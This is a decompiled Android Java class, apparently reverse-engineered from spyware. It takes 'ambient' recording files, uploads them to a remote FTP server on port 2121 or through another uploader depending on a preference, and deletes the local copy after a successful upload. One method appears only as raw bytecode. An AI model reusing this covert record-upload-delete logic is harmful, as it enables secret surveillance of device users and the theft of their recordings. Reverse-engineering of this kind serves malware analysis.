package com.app.system.common.f.a;

import android.content.Context;
import android.content.SharedPreferences;
import com.app.system.common.d.a.c;
import com.app.system.common.h;
import java.io.File;

public class b
  implements e
{
  private final String a;
  private final File b;
  
  public b(String paramString, File paramFile)
  {
    this.a = paramString;
    this.b = paramFile;
  }
  
  private void b(Context paramContext)
  {
    if (new c(this.a).a(paramContext, this.b.getName(), this.b) == 0) {
      this.b.delete();
    }
  }
  
  /* Error */
  private void c(Context paramContext)
  {
    // Byte code:
    //   0: aload_1
    //   1: ldc 48
    //   3: iconst_0
    //   4: invokevirtual 54	android/content/Context:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   7: ldc 56
    //   9: ldc 58
    //   11: invokeinterface 64 3 0
    //   16: astore_2
    //   17: new 66	com/security/c/a
    //   20: dup
    //   21: invokespecial 67	com/security/c/a:<init>	()V
    //   24: astore_1
    //   25: aload_1
    //   26: aload_2
    //   27: sipush 2121
    //   30: ldc 69
    //   32: ldc 69
    //   34: invokevirtual 72	com/security/c/a:a	(Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)Z
    //   37: ifeq +198 -> 235
    //   40: new 74	java/lang/StringBuilder
    //   43: astore_2
    //   44: aload_2
    //   45: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   48: aload_2
    //   49: ldc 77
    //   51: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: aload_2
    //   56: aload_0
    //   57: getfield 21	com/app/system/common/f/a/b:b	Ljava/io/File;
    //   60: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   63: pop
    //   64: ldc 86
    //   66: aload_2
    //   67: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   70: iconst_0
    //   71: anewarray 4	java/lang/Object
    //   74: invokestatic 95	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   77: new 74	java/lang/StringBuilder
    //   80: astore_2
    //   81: aload_2
    //   82: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   85: aload_2
    //   86: ldc 97
    //   88: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   91: pop
    //   92: aload_2
    //   93: aload_0
    //   94: getfield 19	com/app/system/common/f/a/b:a	Ljava/lang/String;
    //   97: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   100: pop
    //   101: aload_2
    //   102: ldc 99
    //   104: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   107: pop
    //   108: aload_2
    //   109: aload_0
    //   110: getfield 21	com/app/system/common/f/a/b:b	Ljava/io/File;
    //   113: invokevirtual 34	java/io/File:getName	()Ljava/lang/String;
    //   116: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   119: pop
    //   120: aload_2
    //   121: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   124: astore_3
    //   125: aload_1
    //   126: aload_0
    //   127: getfield 21	com/app/system/common/f/a/b:b	Ljava/io/File;
    //   130: invokevirtual 102	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   133: aload_3
    //   134: invokevirtual 105	com/security/c/a:a	(Ljava/lang/String;Ljava/lang/String;)Lcom/security/c/b;
    //   137: astore 4
    //   139: new 74	java/lang/StringBuilder
    //   142: astore_2
    //   143: aload_2
    //   144: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   147: aload_2
    //   148: ldc 107
    //   150: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   153: pop
    //   154: aload_2
    //   155: aload_3
    //   156: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   159: pop
    //   160: aload_2
    //   161: ldc 109
    //   163: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   166: pop
    //   167: aload_2
    //   168: aload 4
    //   170: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   173: pop
    //   174: ldc 86
    //   176: aload_2
    //   177: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   180: iconst_0
    //   181: anewarray 4	java/lang/Object
    //   184: invokestatic 95	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   187: getstatic 112	com/app/system/common/f/a/b$1:a	[I
    //   190: aload 4
    //   192: invokevirtual 118	com/security/c/b:ordinal	()I
    //   195: iaload
    //   196: tableswitch	default:+28->224, 1:+31->227, 2:+31->227, 3:+31->227
    //   224: goto +11 -> 235
    //   227: aload_0
    //   228: getfield 21	com/app/system/common/f/a/b:b	Ljava/io/File;
    //   231: invokevirtual 41	java/io/File:delete	()Z
    //   234: pop
    //   235: aload_1
    //   236: invokevirtual 120	com/security/c/a:a	()V
    //   239: goto +37 -> 276
    //   242: astore_2
    //   243: goto +34 -> 277
    //   246: astore_2
    //   247: ldc 86
    //   249: ldc 122
    //   251: iconst_1
    //   252: anewarray 4	java/lang/Object
    //   255: dup
    //   256: iconst_0
    //   257: aload_2
    //   258: aastore
    //   259: invokestatic 124	com/security/d/a:a	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   262: ldc 86
    //   264: aload_2
    //   265: invokevirtual 127	java/io/IOException:getMessage	()Ljava/lang/String;
    //   268: ldc 122
    //   270: invokestatic 132	com/security/d/b:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    //   273: goto -38 -> 235
    //   276: return
    //   277: aload_1
    //   278: invokevirtual 120	com/security/c/a:a	()V
    //   281: aload_2
    //   282: athrow
    //   283: astore_1
    //   284: goto -8 -> 276
    //   287: astore_1
    //   288: goto -7 -> 281
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	291	0	this	b
    //   0	291	1	paramContext	Context
    //   16	161	2	localObject1	Object
    //   242	1	2	localObject2	Object
    //   246	36	2	localIOException	java.io.IOException
    //   124	32	3	str	String
    //   137	54	4	localb	com.security.c.b
    // Exception table:
    //   from	to	target	type
    //   25	224	242	finally
    //   227	235	242	finally
    //   247	273	242	finally
    //   25	224	246	java/io/IOException
    //   227	235	246	java/io/IOException
    //   235	239	283	java/lang/Exception
    //   277	281	287	java/lang/Exception
  }
  
  public void a(Context paramContext)
  {
    if (h.a(this.b).equals("2_AMBIENT")) {
      return;
    }
    if (paramContext.getSharedPreferences("pref", 0).getBoolean("use-ftp-for-files-transfer", true)) {
      c(paramContext);
    } else {
      b(paramContext);
    }
  }
  
  public boolean equals(Object paramObject)
  {
    boolean bool1 = false;
    if ((paramObject != null) && ((paramObject instanceof b)))
    {
      paramObject = (b)paramObject;
      boolean bool2 = bool1;
      if (this.a.equals(((b)paramObject).a))
      {
        bool2 = bool1;
        if (this.b.equals(((b)paramObject).b)) {
          bool2 = true;
        }
      }
      return bool2;
    }
    return false;
  }
  
  public String toString()
  {
    return String.format("REG.AMB.=%s", new Object[] { this.b.getName() });
  }
}


/* Location:              ~/com/app/system/common/f/a/b.class
 *
 * Reversed by:           J
 */